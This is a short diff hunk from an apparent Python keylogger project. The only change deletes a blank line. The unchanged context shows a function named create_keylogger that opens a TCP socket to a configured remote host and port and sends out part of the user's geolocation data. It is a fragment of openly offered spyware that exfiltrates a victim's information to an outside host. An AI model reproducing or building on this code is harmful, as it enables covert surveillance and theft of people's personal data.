@@ -20,7 +20,6 @@ def start_keylogger():
 
 def create_keylogger():
     print("Called the function")
-    
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((CONN_HOST,CONN_PORT))
         s.send(bytes(USER_GEOLOCATION[24:-2], 'utf-8'))
